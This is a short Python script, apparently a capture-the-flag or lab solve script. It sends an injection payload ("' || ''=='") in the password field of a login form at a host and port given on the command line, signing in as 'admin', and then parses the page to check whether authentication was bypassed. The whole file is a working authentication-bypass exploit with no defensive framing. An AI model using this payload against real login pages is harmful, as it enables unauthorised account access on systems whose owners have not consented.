import sys
from webbrowser import get
import requests
from bs4 import BeautifulSoup

host = sys.argv[1]
port = sys.argv[2]    

def exploit():
    username = "admin"
    session = requests.Session()
    r = session.post(f"http://{host}:{port}", data={"login": username, "passwd": "' || ''=='", "action": "signin"})
    print(r.text)

    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("h3", class_="username")
    if req.text == username:
        return 1
    else: return 0
    


if __name__ == '__main__':
    print(exploit())